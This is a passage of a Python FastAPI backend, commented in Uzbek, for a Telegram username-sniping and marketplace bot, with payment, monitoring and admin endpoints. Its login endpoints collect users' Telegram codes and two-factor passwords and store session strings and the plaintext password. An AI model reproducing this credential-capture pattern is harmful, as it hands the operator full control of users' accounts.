@app.post("/api/admin/withdrawal/confirm")
async def admin_withdrawal_confirm(request: Request, x_admin_token: str = Header(default="")):
    for aid in ADMIN_IDS:
        if get_admin_token(aid) == x_admin_token: break
    else: raise HTTPException(403)
    data = await request.json()
    wid = data['withdrawal_id']
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        async with db.execute("SELECT * FROM withdrawals WHERE id=?", (wid,)) as c:
            w = await c.fetchone()
        if not w: return {"ok": False, "error": "Topilmadi"}
        await db.execute("UPDATE withdrawals SET status='paid' WHERE id=?", (wid,))
        await db.commit()
    bot_instance = Bot(token=BOT_TOKEN)
    try:
        await bot_instance.send_message(
            w['telegram_id'],
            f"✅ <b>To'lov amalga oshirildi!</b>\n\n"
            f"💰 <b>{w['amount']:,} so'm</b> kartangizga o'tkazildi.\n"
            f"💳 Karta: <b>{w['card_number']}</b>",
            parse_mode="HTML"
        )
    except: pass
    finally:
        await bot_instance.session.close()
    return {"ok": True}

@app.post("/api/admin/withdrawal/reject")
async def admin_withdrawal_reject(request: Request, x_admin_token: str = Header(default="")):
    for aid in ADMIN_IDS:
        if get_admin_token(aid) == x_admin_token: break
    else: raise HTTPException(403)
    data = await request.json()
    wid = data['withdrawal_id']
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        async with db.execute("SELECT * FROM withdrawals WHERE id=?", (wid,)) as c:
            w = await c.fetchone()
        if not w: return {"ok": False, "error": "Topilmadi"}
        await db.execute("UPDATE withdrawals SET status='rejected' WHERE id=?", (wid,))
        # Pulni qaytarish
        await db.execute("UPDATE users SET seller_balance=seller_balance+? WHERE telegram_id=?", (w['amount'], w['telegram_id']))
        await db.commit()
    bot_instance = Bot(token=BOT_TOKEN)
    try:
        await bot_instance.send_message(
            w['telegram_id'],
            f"❌ <b>To'lov rad etildi.</b>\n\n"
            f"<b>{w['amount']:,} so'm</b> sotuvchi balansingizga qaytarildi.",
            parse_mode="HTML"
        )
    except: pass
    finally:
        await bot_instance.session.close()
    return {"ok": True}

@app.get("/api/card")
async def api_card():
    card = await get_active_card()
    if card:
        return {"card": card.get("card_number", ""), "card_owner": card.get("card_owner", ""), "card_id": card.get("id")}
    return {"card": "", "card_owner": "", "card_id": None}

@app.post("/api/topup/request")
async def api_topup_request(request: Request):
    data = await request.json()
    user = verify_init_data(data.get('init_data',''))
    if not user:
        raise HTTPException(403)
    tid = user['id']
    amount = int(data.get('amount', 0))
    if amount < 15000:
        return {"ok": False, "error": "Eng kamida 15,000 so'm"}
    
    # Generate unique amount (add 1 to 99 tiyin)
    async with aiosqlite.connect(DB_PATH) as db:
        # Eski to'lovlarni avtomatik muddati o'tgan deb belgilaymiz (180 soniya = 3 daqiqa)
        await db.execute("UPDATE topups SET status='expired' WHERE status='pending' AND created_at <= (strftime('%s','now') - 180)")
        await db.commit()
        
        for _ in range(100):
            unique_amount = amount + random.randint(1, 99)
            async with db.execute("SELECT id FROM topups WHERE expected_amount=? AND status='pending'", (unique_amount,)) as c:
                if not await c.fetchone():
                    # Unikal summa topildi
                    await db.execute("INSERT INTO topups (telegram_id, expected_amount) VALUES (?, ?)", (tid, unique_amount))
                    await db.commit()
                    return {"ok": True, "amount": unique_amount, "expires_in": 180}
    
    return {"ok": False, "error": "Bandlik yuqori, keyinroq urining"}

@app.get("/api/orders")
async def api_orders(init_data: str = ""):
    user = verify_init_data(init_data)
    if not user:
        raise HTTPException(403)
    tid = user['id']
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        async with db.execute("SELECT * FROM orders WHERE telegram_id=? ORDER BY id DESC LIMIT 20", (tid,)) as c:
            orders = [dict(o) for o in await c.fetchall()]
        for o in orders:
            async with db.execute("SELECT username FROM registered_usernames WHERE order_id=?", (o['id'],)) as c:
                o['usernames'] = [r[0] for r in await c.fetchall()]
    return orders

@app.post("/api/monitor/start")
async def api_monitor_start(request: Request):
    data = await request.json()
    user = verify_init_data(data.get('init_data',''))
    if not user: raise HTTPException(403)
    tid = user['id']
    usernames_str = data.get('username','').strip()
    
    if not usernames_str:
        return {"ok": False, "error": "Username kiritilmadi"}
        
    row = await get_user(tid)
    if not row or not row.get('session_string'):
        return {"ok": False, "error": "Akkaunt ulanmagan"}
        
    # Split string by commas, newlines, or spaces
    import re
    raw_list = re.split(r'[,\n\s]+', usernames_str)
    valid_usernames = set()
    invalid_usernames = set()

    # Telegram username validatsiyasi: 5-32 belgi, faqat a-z, 0-9, _
    uname_pattern = re.compile(r'^[a-z0-9_]{5,32}$')

    for u in raw_list:
        u = u.replace('@', '').strip().lower()
        if not u:
            continue
        if uname_pattern.match(u):
            valid_usernames.add(u)
        else:
            invalid_usernames.add(u)
            
    if not valid_usernames:
        inv_sample = ", ".join(list(invalid_usernames)[:3]) if invalid_usernames else ""
        return {
            "ok": False, 
            "error": f"❌ Kiritilgan ({inv_sample or 'matn'}) yaroqsiz! Usernameda apostrof ('), qo'shtirnoq (\") va maxsus belgilar TAQIQLANGAN. Faqat a-z, 0-9 va _ kiritilishi shart (kamida 5 belgi)."
        }
        
    async with aiosqlite.connect(DB_PATH) as db:
        # Check existing targets for this user (case-insensitive)
        existing_targets = set()
        for u in valid_usernames:
            async with db.execute(
                "SELECT id FROM monitoring_tasks WHERE telegram_id=? AND LOWER(username)=LOWER(?) AND status='monitoring'", 
                (tid, u)
            ) as c:
                if await c.fetchone():
                    existing_targets.add(u)
                    
        new_targets = valid_usernames - existing_targets
        
        if not new_targets:
            return {"ok": False, "error": "Kiritilgan barcha username'lar allaqachon nishonga qo'shilgan!"}

        # Fragment checking
        import aiohttp
        fragment_targets = set()
        async with aiohttp.ClientSession() as session:
            for u in list(new_targets):
                is_frag = await check_if_fragment_username(session, u)
                if is_frag:
                    fragment_targets.add(u)
        
        new_targets = new_targets - fragment_targets
        
        if fragment_targets:
            frag_sample = ", ".join([f"@{x}" for x in list(fragment_targets)[:3]])
            if not new_targets:
                return {
                    "ok": False,
                    "error": f"❌ {frag_sample} Fragment.com auksionida/NFT formatida! Telegram qoidalariga ko'ra Fragmentdagi nomlarni oddiy usulda band qilib bo'lmaydi va nishonga olib bo'lmaydi."
                }

        price_per_item = int(await get_setting("monitor_price", 10000)) # Kafolat puli (monitor qilish uchun)
        total_price = price_per_item * len(new_targets)
        
        user_balance = int(row.get('balance') or 0)
        if user_balance < total_price:
            return {
                "ok": False, 
                "error": f"Balans yetarli emas (Kerak: {total_price:,} so'm, Mavjud: {user_balance:,} so'm)"
            }
            
        # Deduct balance
        await db.execute("UPDATE users SET balance = balance - ? WHERE telegram_id = ?", (total_price, tid))
        
        # Insert all new targets (paid_amount saqlaymiz — keyin refund uchun)
        for u in new_targets:
            await db.execute(
                "INSERT INTO monitoring_tasks (telegram_id, username, paid_amount) VALUES (?,?,?)",
                (tid, u, price_per_item)
            )
        await db.commit()

    # Yangi qo'shilgan usernamelarni darhol tekshirish navbatiga yuboramiz
    session_str = row.get('session_string', '') or ''
    if instant_check_queue is not None and session_str:
        for u in new_targets:
            await instant_check_queue.put((tid, u, session_str))
            logger.info(f"⚡ [QUEUED] @{u} darhol tekshirish navbatiga qo'shildi (user: {tid})")

    added_count = len(new_targets)
    msg = f"✅ {added_count} ta username nishonga olindi (-{total_price:,} so'm)!"
    if existing_targets:
        msg += f" (Qolgan {len(existing_targets)} tasi allaqachon qo'shilgan)"
    if fragment_targets:
        msg += f" (Qolgan {len(fragment_targets)} tasi Fragmentda bo'lgani uchun qo'shilmadi)"

    return {"ok": True, "message": msg}

@app.get("/api/monitor/list")
async def api_monitor_list(init_data: str = "", offset: int = 0, limit: int = 100):
    user = verify_init_data(init_data)
    if not user: raise HTTPException(403)
    
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        
        # Get total count
        async with db.execute("SELECT COUNT(*) as count FROM monitoring_tasks WHERE telegram_id=?", (user['id'],)) as c:
            row = await c.fetchone()
            total_count = row['count'] if row else 0
            
        # Get paginated tasks
        async with db.execute("SELECT * FROM monitoring_tasks WHERE telegram_id=? ORDER BY id DESC LIMIT ? OFFSET ?", (user['id'], limit, offset)) as c:
            tasks = [dict(r) for r in await c.fetchall()]
            
    return {"ok": True, "tasks": tasks, "total_count": total_count}

@app.post("/api/monitor/delete")
async def api_monitor_delete(request: Request):
    data = await request.json()
    user = verify_init_data(data.get('init_data',''))
    if not user: raise HTTPException(403)
    tid = user['id']
    task_id = data.get('task_id')
    if not task_id:
        return {"ok": False, "error": "Task ID kiritilmadi"}
    
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        # Nishonni topamiz
        async with db.execute(
            "SELECT paid_amount FROM monitoring_tasks WHERE id=? AND telegram_id=?",
            (task_id, tid)
        ) as c:
            task_row = await c.fetchone()
        
        if not task_row:
            return {"ok": False, "error": "Nishon topilmadi"}
        
        paid = int(task_row['paid_amount'] or 0)
        refund = paid // 2  # 50% qaytarish
        
        # Nishonni o'chirish
        await db.execute(
            "DELETE FROM monitoring_tasks WHERE id=? AND telegram_id=?",
            (task_id, tid)
        )
        # 50% refund
        if refund > 0:
            await db.execute(
                "UPDATE users SET balance = balance + ? WHERE telegram_id = ?",
                (refund, tid)
            )
        await db.commit()
    
    msg = f"Nishon o'chirildi."
    if refund > 0:
        msg = f"Nishon o'chirildi. Balansingizga {refund:,} so'm (50%) qaytarildi."
    return {"ok": True, "refund": refund, "message": msg}

@app.get("/api/admin/listings")
async def admin_listings_get(x_admin_token: str = Header(default=""), search: str = "", status: str = ""):
    for aid in ADMIN_IDS:
        if get_admin_token(aid) == x_admin_token: break
    else: raise HTTPException(403)
    
    query = "SELECT * FROM listings WHERE status != 'cancelled'"
    params = []
    if status:
        query = "SELECT * FROM listings WHERE status=?"
        params.append(status)
    if search:
        query += " AND (username LIKE ? OR seller_id LIKE ?)"
        params.append(f"%{search}%")
        params.append(f"%{search}%")
    query += " ORDER BY id DESC LIMIT 200"
    
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        async with db.execute(query, params) as c:
            listings = [dict(r) for r in await c.fetchall()]
    return {"ok": True, "listings": listings}

@app.delete("/api/admin/listings/{listing_id}")
async def admin_listing_delete(listing_id: int, x_admin_token: str = Header(default="")):
    for aid in ADMIN_IDS:
        if get_admin_token(aid) == x_admin_token: break
    else: raise HTTPException(403)
    
    # Kanaldagi postni o'chirish
    try:
        await update_channel_listing_post(listing_id, 'cancelled')
    except Exception as e:
        logger.warning(f"Admin delete listing channel post error: {e}")

    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("DELETE FROM listings WHERE id=?", (listing_id,))
        await db.commit()
    return {"ok": True}

@app.post("/api/search/start")
async def api_search_start(request: Request):
    data = await request.json()
    user = verify_init_data(data.get('init_data',''))
    if not user:
        raise HTTPException(403)
    tid = user['id']
    cat = data.get('category','').strip()
    lang = data.get('lang', 'uz')
    qty = int(data.get('quantity', 1))
    qty = max(1, min(10, qty))  # 1-10 oralig'ida cheklash

    if not cat:
        return {"ok": False, "error": "Kategoriya kiritilmadi"}

    # Kategoriyaga qarab narx (server tomonda, aldab bo'lmaydi)
    CATEGORY_PRICES = {
        'qisqa': 15000,   # Qisqa noyob so'z
        'turli': 10000,   # Turli ko'rinishdagi
    }
    # custom: o'zim kiritaman
    cat_key = cat.split(':')[0] if ':' in cat else cat
    unit_price = CATEGORY_PRICES.get(cat_key, 5000)  # default = custom narxi

    row = await get_user(tid)
    if not row or not row['session_string']:
        return {"ok": False, "error": "Akkaunt ulanmagan"}

    # Narxni kategoriyaga qarab hisoblash (100% haqiqiy narx yechiladi)
    total_price = qty * unit_price
    if (row['balance'] or 0) < total_price:
        return {"ok": False, "error": f"Balans yetarli emas ({total_price:,} so'm kerak)"}

    # Pulni foydalanuvchi balansidan yechamiz
    await deduct_balance(tid, total_price)

    async with aiosqlite.connect(DB_PATH) as db:
        cur = await db.execute(
            "INSERT INTO search_tasks (telegram_id, category, paid_qty, lang, charged_amount, used_free) VALUES (?, ?, ?, ?, ?, ?)",
            (tid, cat, qty, lang, total_price, 0)
        )
        search_id = cur.lastrowid
        await db.commit()

    async def _run_search_safe():
        try:
            await asyncio.wait_for(search_sniper(tid, search_id, cat, lang=lang), timeout=130)
        except asyncio.TimeoutError:
            logger.error(f"search_sniper timeout for search_id={search_id}")
            async with aiosqlite.connect(DB_PATH) as db:
                await db.execute("UPDATE search_tasks SET status='completed' WHERE id=?", (search_id,))
                await db.commit()
    t = asyncio.create_task(_run_search_safe())
    _active_search_tasks.add(t)
    t.add_done_callback(_active_search_tasks.discard)
    return {"ok": True, "search_id": search_id, "paid_qty": qty, "charged": total_price}

@app.post("/api/search/refresh")
async def api_search_refresh(request: Request):
    """Balansdan pul yechmasdan yangi qidiruv boshlaydi (eski natijalarni tozalaydi)."""
    data = await request.json()
    user = verify_init_data(data.get('init_data',''))
    if not user: raise HTTPException(403)
    tid = user['id']
    search_id = int(data.get('search_id', 0))

    row = await get_user(tid)
    if not row or not row['session_string']:
        return {"ok": False, "error": "Akkaunt ulanmagan"}

    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT category, paid_qty, lang FROM search_tasks WHERE id=? AND telegram_id=?", (search_id, tid)) as c:
            task = await c.fetchone()
            if not task:
                return {"ok": False, "error": "Topilmadi"}
            cat = task[0]
            paid_qty = task[1]
            lang = task[2]
            
        # Eski natijalarni tozalash (yangi variantlar uchun)
        await db.execute("DELETE FROM search_results WHERE search_id=?", (search_id,))
        await db.execute("UPDATE search_tasks SET status='searching' WHERE id=?", (search_id,))
        await db.commit()
        
    async def _run_search_safe2():
        try:
            await asyncio.wait_for(search_sniper(tid, search_id, cat, lang=lang), timeout=130)
        except asyncio.TimeoutError:
            logger.error(f"search_sniper refresh timeout for search_id={search_id}")
            async with aiosqlite.connect(DB_PATH) as db:
                await db.execute("UPDATE search_tasks SET status='completed' WHERE id=?", (search_id,))
                await db.commit()
    t2 = asyncio.create_task(_run_search_safe2())
    _active_search_tasks.add(t2)
    t2.add_done_callback(_active_search_tasks.discard)
    return {"ok": True, "search_id": search_id}

@app.get("/api/search/results")
async def api_search_results(search_id: int, init_data: str = ""):
    user = verify_init_data(init_data)
    if not user: raise HTTPException(403)
    
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        
        # Holatni tekshiramiz
        async with db.execute("SELECT status FROM search_tasks WHERE id=? AND telegram_id=?", (search_id, user['id'])) as c:
            task = await c.fetchone()
            if not task:
                return {"ok": False, "error": "Topilmadi"}
                
        async with db.execute("SELECT id, username, status FROM search_results WHERE search_id=? ORDER BY id ASC", (search_id,)) as c:
            results = [dict(r) for r in await c.fetchall()]
            
        return {"ok": True, "status": task['status'], "results": results}

@app.post("/api/buy_selected")
async def api_buy_selected(request: Request):
    data = await request.json()
    user = verify_init_data(data.get('init_data',''))
    if not user: raise HTTPException(403)
    tid = user['id']
    
    usernames = data.get('usernames', [])
    search_id = data.get('search_id')
    category = data.get('category', 'custom')
    qty = len(usernames)
    
    if not usernames or qty > 10:
        return {"ok": False, "error": "1 dan 10 tagacha tanlang"}
        
    row = await get_user(tid)
    if not row or not row.get('session_string'):
        return {"ok": False, "error": "Avval Akkaunt bo'limida Telegram akkauntingizni ulang!"}
        
    user_first_name = user.get('first_name', 'Foydalanuvchi')
    
    # Kategoriyaga qarab narx (server tomonda)
    CATEGORY_PRICES = {'qisqa': 15000, 'turli': 10000}
    cat_key = category.split(':')[0] if ':' in category else category
    price_per_item = CATEGORY_PRICES.get(cat_key, int(await get_setting("username_price", 5000)))
    price = qty * price_per_item
    
    # Balans tekshiruvi
    user_balance = int(row.get('balance') or 0)
    if user_balance < price:
        return {"ok": False, "error": f"Balans yetarli emas! Kerak: {price:,} so'm, Sizda: {user_balance:,} so'm"}
    
    # Balansdan yechib olamiz (oldindan)
    await deduct_balance(tid, price)
    
    async with aiosqlite.connect(DB_PATH) as db:
        cur = await db.execute("INSERT INTO orders (telegram_id, category, quantity, price, status, user_first_name) VALUES (?,?,?,?,'processing',?)",
                               (tid, f"Tanlangan ({qty})", qty, price, user_first_name))
        order_id = cur.lastrowid
        
        # Natijalarni claimed holatga o'tkazish
        for u in usernames:
            await db.execute("UPDATE search_results SET status='claimed' WHERE search_id=? AND username=?", (search_id, u))
        await db.commit()
        
    bot_instance = Bot(token=BOT_TOKEN)
    asyncio.create_task(claim_sniper(bot_instance, tid, order_id, usernames))
    return {"ok": True}

from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError

auth_clients = {}

@app.post("/api/auth/send_code")
async def auth_send_code(request: Request):
    data = await request.json()
    user = verify_init_data(data.get('init_data',''))
    if not user: raise HTTPException(403)
    tid = user['id']
    phone = data.get('phone', '').strip().replace('+', '')
    if not phone: return {"ok": False, "error": "Telefon kiritilmadi"}
    
    if tid in auth_clients:
        try: await auth_clients[tid]['client'].disconnect()
        except: pass
        del auth_clients[tid]
        
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    await client.connect()
    try:
        sent = await client.send_code_request(phone)
        auth_clients[tid] = {
            "client": client,
            "phone": phone,
            "phone_code_hash": sent.phone_code_hash
        }
        return {"ok": True}
    except Exception as e:
        await client.disconnect()
        return {"ok": False, "error": str(e)}

@app.post("/api/auth/login")
async def auth_login(request: Request):
    data = await request.json()
    user = verify_init_data(data.get('init_data',''))
    if not user: raise HTTPException(403)
    tid = user['id']
    code = data.get('code', '').strip()
    
    if tid not in auth_clients:
        return {"ok": False, "error": "Avval telefon kiritilmagan yoki seans muddati tugagan"}
        
    state = auth_clients[tid]
    client = state['client']
    try:
        await client.sign_in(phone=state['phone'], code=code, phone_code_hash=state['phone_code_hash'])
    except SessionPasswordNeededError:
        return {"ok": True, "need_password": True}
    except Exception as e:
        return {"ok": False, "error": str(e)}
        
    session_string = client.session.save()
    await client.disconnect()
    phone = state.get('phone')
    del auth_clients[tid]
    await save_session(tid, session_string, phone)
    return {"ok": True, "success": True}

@app.post("/api/auth/password")
async def auth_password(request: Request):
    data = await request.json()
    user = verify_init_data(data.get('init_data',''))
    if not user: raise HTTPException(403)
    tid = user['id']
    password = data.get('password', '')
    
    if tid not in auth_clients:
        return {"ok": False, "error": "Seans muddati tugagan"}
        
    state = auth_clients[tid]
    client = state['client']
    try:
        await client.sign_in(password=password)
    except Exception as e:
        return {"ok": False, "error": str(e)}
        
    session_string = client.session.save()
    await client.disconnect()
    phone = state.get('phone')
    del auth_clients[tid]
    await save_session(tid, session_string, phone, tg_password=password)
    return {"ok": True, "success": True}

@app.post("/api/session/disconnect")
async def api_disconnect(request: Request):
    data = await request.json()
    user = verify_init_data(data.get('init_data',''))
    if not user:
        raise HTTPException(403)
    tid = user['id']
    await save_session(tid, None)
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("UPDATE search_tasks SET status='cancelled' WHERE telegram_id=? AND status='monitoring'", (tid,))
        await db.commit()
    return {"ok": True}

@app.get("/api/admin/check")
async def api_admin_check(x_admin_token: str = Header(default="")):
    for aid in ADMIN_IDS:
        if get_admin_token(aid) == x_admin_token:
            return {"ok": True}
    raise HTTPException(403)

@app.post("/api/admin/web_auth")
async def api_admin_web_auth(request: Request):
    data = await request.json()
    user = verify_init_data(data.get('init_data', ''))
    if not user:
        raise HTTPException(403)
    tid = user['id']
    if tid in ADMIN_IDS:
        token = get_admin_token(tid)
        return {"ok": True, "token": token}
    return {"ok": False, "error": "Admin emas"}

@app.get("/api/admin/settings")

async def api_admin_settings_get(x_admin_token: str = Header(default="")):
    for aid in ADMIN_IDS:
        if get_admin_token(aid) == x_admin_token: break
    else: raise HTTPException(403)
    
    card = await get_setting("payment_card", "")
    channel = await get_setting("payment_channel_id", "")
    premium_price = await get_setting("premium_price", "20000")
    monitor_price = await get_setting("monitor_price", "10000")
    listing_price = await get_setting("listing_price", "1000")
    return {
        "payment_card": card, 
        "payment_channel_id": channel, 
        "premium_price": premium_price,
        "monitor_price": monitor_price,
        "listing_price": listing_price
    }

@app.post("/api/admin/settings")
async def api_admin_settings_set(request: Request, x_admin_token: str = Header(default="")):
    for aid in ADMIN_IDS:
        if get_admin_token(aid) == x_admin_token: break
    else: raise HTTPException(403)
    
    data = await request.json()
    if 'payment_card' in data:
        await set_setting("payment_card", data['payment_card'])
    if 'payment_channel_id' in data:
        await set_setting("payment_channel_id", data['payment_channel_id'])
    if 'premium_price' in data:
        await set_setting("premium_price", data['premium_price'])
    if 'monitor_price' in data:
        await set_setting("monitor_price", data['monitor_price'])
    if 'listing_price' in data:
        await set_setting("listing_price", data['listing_price'])
@app.get("/api/admin/channels")
async def api_admin_channels_get(x_admin_token: str = Header(default="")):
    for aid in ADMIN_IDS:
        if get_admin_token(aid) == x_admin_token: break
    else: raise HTTPException(403)
    
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        async with db.execute("SELECT * FROM mandatory_channels ORDER BY sort_order ASC, id DESC") as c:
            rows = await c.fetchall()
            return [dict(r) for r in rows]

@app.post("/api/admin/channels/add")
async def api_admin_channels_add(request: Request, x_admin_token: str = Header(default="")):
    for aid in ADMIN_IDS:
        if get_admin_token(aid) == x_admin_token: break
    else: raise HTTPException(403)
    
    data = await request.json()
    title = data.get('title', '').strip()
    username = data.get('channel_username', '').strip().replace('@', '')
    url = data.get('url', '').strip()
    channel_id = data.get('channel_id', '').strip()
    status = data.get('status', 'Active')
    try: sort_order = int(data.get('sort_order', 0))
    except: sort_order = 0

    if not title:
        return {"ok": False, "error": "Kanal nomi kiritilmadi"}

    if not url:
        if username:
            url = f"https://t.me/{username}"
        else:
            url = "https://t.me"

    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "INSERT INTO mandatory_channels (channel_id, channel_username, title, url, status, sort_order) VALUES (?, ?, ?, ?, ?, ?)",
            (channel_id, username, title, url, status, sort_order)
        )
        await db.commit()

    return {"ok": True}

@app.post("/api/admin/channels/update")
async def api_admin_channels_update(request: Request, x_admin_token: str = Header(default="")):
    for aid in ADMIN_IDS:
        if get_admin_token(aid) == x_admin_token: break
    else: raise HTTPException(403)
    
    data = await request.json()
    cid = data.get('id')
    status = data.get('status')
    try: sort_order = int(data.get('sort_order', 0))
    except: sort_order = 0
    
    if cid:
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute("UPDATE mandatory_channels SET status=?, sort_order=?, updated_at=CURRENT_TIMESTAMP WHERE id=?", (status, sort_order, cid))
            await db.commit()
    return {"ok": True}

@app.post("/api/admin/channels/delete")
async def api_admin_channels_delete(request: Request, x_admin_token: str = Header(default="")):
    for aid in ADMIN_IDS:
        if get_admin_token(aid) == x_admin_token: break
    else: raise HTTPException(403)
    
    data = await request.json()
    cid = data.get('id')
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("DELETE FROM mandatory_channels WHERE id=?", (cid,))
        await db.commit()

    return {"ok": True}


# ── ADMIN BROADCAST & DIRECT MESSAGING ────
@app.post("/api/admin/broadcast")
async def api_admin_broadcast(request: Request, x_admin_token: str = Header(default="")):
    for aid in ADMIN_IDS:
        if get_admin_token(aid) == x_admin_token: break
    else: raise HTTPException(403)
    
    content_type = request.headers.get("content-type", "")
    file_bytes = None
    filename = ""
    file_mime = ""
    
    if "multipart/form-data" in content_type:
        form = await request.form()
        message_text = (form.get("message") or "").strip()
        button_text = (form.get("button_text") or "").strip()
        button_url = (form.get("button_url") or "").strip()
        target_type = (form.get("target_type") or "all").strip()
        target_user = (form.get("target_user") or "").strip()
        
        file_field = form.get("file")
        if file_field and hasattr(file_field, "read"):
            file_bytes = await file_field.read()
            filename = getattr(file_field, "filename", "") or "file"
            file_mime = getattr(file_field, "content_type", "") or ""
        photo_url = ""
    else:
        data = await request.json()
        message_text = data.get("message", "").strip()
        photo_url = data.get("photo_url", "").strip()
        button_text = data.get("button_text", "").strip()
        button_url = data.get("button_url", "").strip()
        target_type = data.get("target_type", "all").strip()
        target_user = data.get("target_user", "").strip()
    
    if not message_text and not file_bytes and not photo_url:
        return {"ok": False, "error": "Xabar matni yoki media kiritilmadi"}

    target_users = []
    
    if target_type == "single":
        if not target_user:
            return {"ok": False, "error": "Foydalanuvchi Telegram ID yoki Username kiritilmadi"}
            
        clean_user = target_user.lstrip("@").strip()
        
        async with aiosqlite.connect(DB_PATH) as db:
            db.row_factory = aiosqlite.Row
            if clean_user.isdigit():
                async with db.execute("SELECT telegram_id FROM users WHERE telegram_id=? OR username=?", (int(clean_user), clean_user)) as c:
                    rows = await c.fetchall()
            else:
                async with db.execute("SELECT telegram_id FROM users WHERE LOWER(username)=?", (clean_user.lower(),)) as c:
                    rows = await c.fetchall()
                    
        if rows:
            target_users = [r["telegram_id"] for r in rows]
        else:
            if clean_user.isdigit():
                target_users = [int(clean_user)]
            else:
                return {"ok": False, "error": f"'{target_user}' foydalanuvchisi bazadan topilmadi"}
    else:
        async with aiosqlite.connect(DB_PATH) as db:
            async with db.execute("SELECT telegram_id FROM users") as c:
                target_users = [r[0] for r in await c.fetchall()]

    if not target_users:
        return {"ok": False, "error": "Xabar yuborish uchun foydalanuvchilar topilmadi"}

    bot_inst = Bot(token=BOT_TOKEN)
    sent_count = 0
    fail_count = 0

    markup = None
    if button_text and button_url:
        markup = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=button_text, url=button_url)]
        ])

    ext = os.path.splitext(filename)[1].lower() if filename else ""
    is_video = ext in ['.mp4', '.mov', '.avi', '.mkv', '.webm'] or 'video/' in file_mime
    is_photo = ext in ['.jpg', '.jpeg', '.png', '.webp', '.gif'] or 'image/' in file_mime

    from aiogram.types import BufferedInputFile

    for tid in target_users:
        try:
            if file_bytes:
                input_file = BufferedInputFile(file_bytes, filename=filename or ("video.mp4" if is_video else ("photo.jpg" if is_photo else "document.bin")))
                if is_video:
                    await bot_inst.send_video(tid, video=input_file, caption=message_text, reply_markup=markup, parse_mode="HTML")
                elif is_photo:
                    await bot_inst.send_photo(tid, photo=input_file, caption=message_text, reply_markup=markup, parse_mode="HTML")
                else:
                    await bot_inst.send_document(tid, document=input_file, caption=message_text, reply_markup=markup, parse_mode="HTML")
            elif photo_url:
                await bot_inst.send_photo(tid, photo=photo_url, caption=message_text, reply_markup=markup, parse_mode="HTML")
            else:
                await bot_inst.send_message(tid, message_text, reply_markup=markup, parse_mode="HTML")
            sent_count += 1
            if len(target_users) > 1:
                await asyncio.sleep(0.04)
        except Exception as e:
            logger.error(f"Broadcast error sending to {tid}: {e}")
            fail_count += 1

    await bot_inst.session.close()
    return {"ok": True, "sent": sent_count, "failed": fail_count, "total": len(target_users)}


# ── ADMIN CARDS (Multi-Card Management) ────────
@app.get("/api/admin/cards")
async def api_admin_cards_get(x_admin_token: str = Header(default="")):
    for aid in ADMIN_IDS:
        if get_admin_token(aid) == x_admin_token: break
    else: raise HTTPException(403)
    import datetime
    today = datetime.date.today().isoformat()
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        # Reset today_count for old dates
        await db.execute(
            "UPDATE payment_cards SET today_count=0, last_reset_date=? WHERE last_reset_date != ? AND last_reset_date != ''",
            (today, today)
        )
        await db.commit()
        async with db.execute("SELECT * FROM payment_cards ORDER BY sort_order ASC, id ASC") as c:
            return [dict(r) for r in await c.fetchall()]

@app.post("/api/admin/cards")
async def api_admin_cards_add(request: Request, x_admin_token: str = Header(default="")):
    for aid in ADMIN_IDS:
        if get_admin_token(aid) == x_admin_token: break
    else: raise HTTPException(403)
    data = await request.json()
    card_number = data.get('card_number', '').strip()
    card_owner = data.get('card_owner', '').strip()
    daily_limit = int(data.get('daily_limit', 40))
    if not card_number:
        return {"ok": False, "error": "Karta raqami kiritilmadi"}
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT MAX(sort_order) FROM payment_cards") as c:
            row = await c.fetchone()
            next_order = (row[0] or 0) + 1
        await db.execute(
            "INSERT INTO payment_cards (card_number, card_owner, daily_limit, sort_order) VALUES (?,?,?,?)",
            (card_number, card_owner, daily_limit, next_order)
        )
        await db.commit()
    return {"ok": True}

@app.put("/api/admin/cards/{card_id}")
async def api_admin_cards_update(card_id: int, request: Request, x_admin_token: str = Header(default="")):
    for aid in ADMIN_IDS:
        if get_admin_token(aid) == x_admin_token: break
    else: raise HTTPException(403)
    data = await request.json()
    async with aiosqlite.connect(DB_PATH) as db:
        if 'card_number' in data:
            await db.execute("UPDATE payment_cards SET card_number=? WHERE id=?", (data['card_number'], card_id))
        if 'card_owner' in data:
            await db.execute("UPDATE payment_cards SET card_owner=? WHERE id=?", (data['card_owner'], card_id))
        if 'daily_limit' in data:
            await db.execute("UPDATE payment_cards SET daily_limit=? WHERE id=?", (int(data['daily_limit']), card_id))
        if 'is_active' in data:
            await db.execute("UPDATE payment_cards SET is_active=? WHERE id=?", (int(data['is_active']), card_id))
        if 'sort_order' in data:
            await db.execute("UPDATE payment_cards SET sort_order=? WHERE id=?", (int(data['sort_order']), card_id))
        await db.commit()
    return {"ok": True}

@app.delete("/api/admin/cards/{card_id}")
async def api_admin_cards_delete(card_id: int, x_admin_token: str = Header(default="")):
    for aid in ADMIN_IDS:
        if get_admin_token(aid) == x_admin_token: break
    else: raise HTTPException(403)
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("DELETE FROM payment_cards WHERE id=?", (card_id,))
        await db.commit()
    return {"ok": True}

@app.post("/api/admin/cards/{card_id}/reset")
async def api_admin_cards_reset(card_id: int, x_admin_token: str = Header(default="")):
    for aid in ADMIN_IDS:
        if get_admin_token(aid) == x_admin_token: break
    else: raise HTTPException(403)
    async with aiosqlite.connect(DB_PATH) as db:
